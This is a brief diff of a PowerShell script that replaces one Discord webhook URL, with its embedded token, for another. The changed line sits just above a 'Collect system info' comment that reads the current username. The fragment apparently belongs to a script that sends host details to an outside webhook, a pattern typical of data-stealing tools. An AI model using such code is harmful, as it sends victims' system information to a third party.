@@ -26,7 +26,7 @@ try {
 
 # ----------- WEBHOOK BLOCK BEGIN -----------
 
-$webhookUrl = "https://discord.com/api/webhooks/1375349477132468355/pC_7VCDZ3KdPpkR3MtKWLQbRre_Yi4fE2LUEaLpW3RsxAIVluuIgUGa0KxLT2s_ip5fH"
+$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"
 
 # Collect system info
 $user = $env:USERNAME
